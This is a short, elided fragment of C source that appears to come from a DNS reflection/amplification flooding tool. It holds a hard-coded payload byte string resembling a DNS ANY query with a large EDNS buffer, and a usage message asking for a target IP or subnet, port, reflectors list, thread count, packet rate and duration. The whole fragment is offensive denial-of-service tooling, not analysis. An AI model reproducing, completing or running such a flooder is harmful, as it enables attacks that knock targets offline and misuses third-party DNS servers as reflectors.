...
static const char PAYLOAD[] =
    "\xc4\x75\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\xff\x00\x01\x00\x00\x29\x23\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
...
void print_usage(char *prog_name) {
  fprintf(stdout, "Usage: %s <ip/32/24> <port> <reflectors list> <threads> <pps> <time> \n", prog_name);
  return;
}
